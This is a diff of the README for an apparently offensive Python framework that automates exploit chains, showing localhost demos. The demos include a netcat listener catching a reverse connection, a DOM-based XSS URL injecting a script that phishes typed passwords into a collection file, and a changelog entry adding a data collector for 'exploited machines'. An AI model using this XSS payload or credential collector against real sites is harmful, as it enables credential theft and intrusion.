@@ -4,7 +4,7 @@
 
 ## About
 
-This little asyncio-based framework was created in order to simplify exploit chain development for vulnerable applications. All you have to do is:
+This framework was created in order to simplify attack automation and exploit development. All you have to do is:
 
 ```python
 async def send_xxe(scenario):
@@ -61,20 +61,36 @@ if __name__ == "__main__":
 
 ## Example
 
-A full example is included in the `horrors/example` directory. Try it out by running:
+Examples are included in the `horrors/examples` directory. Try it out by running:
+
+### 1. vulnchain
 
     $ nc -lv4 4444
-    $ horrors/example/victim.py
-    $ horrors/example/attacker.py
-
-### Demo
+    $ horrors/examples/vulnchain/victim.py
+    $ horrors/examples/vulnchain/attacker.py
 
 [![example](https://img.youtube.com/vi/VQwysZItPrE/0.jpg)](https://www.youtube.com/watch?v=VQwysZItPrE)
 
+### 2. xssphish
+
+Or (this one requires interaction):
+
+    $ horrors/examples/xssphish/victim.py
+    $ horrors/examples/xssphish/attacker.py
+
+Now visit `http://127.0.0.1:8008/?message=<script src="http://127.0.0.1/fakequery.js"></script>`, type some passwords and watch `collected.json` for incoming credentials.
+
+![xssphish](examples/xssphish/dom-based-xss-phish.jpg)
+
+
 ## Changelog
 
+* **2021/08/26** Beta (v0.3)
+    * Yet another refactoring.
+    * Added full HTTP support using Flask.
+    * Added `utility/collector.py` to simplify data collection from exploited machines (and another related example).
 * **2021/08/10** Beta (v0.2)
-   * Refactored and largely simplified codebase: it is now easier to reuse code between multiple scenarios by mixing functions, wrapping in classes etc.
-   * Steps are not executed sequentially, you decide depending on signals (events) registered when adding to scenario (`story.add(func, when='something')`).
-   * Removed asyncio.Event dependency since I was not able to make it work the way I wanted.
+    * Refactored and largely simplified codebase: it is now easier to reuse code between multiple scenarios by mixing functions, wrapping in classes etc.
+    * Steps are not executed sequentially, you decide depending on signals (events) registered when adding to scenario (`story.add(func, when='something')`).
+    * Removed asyncio.Event dependency since I was not able to make it work the way I wanted.
 * **2021/07/30** Initial release (v0.1)
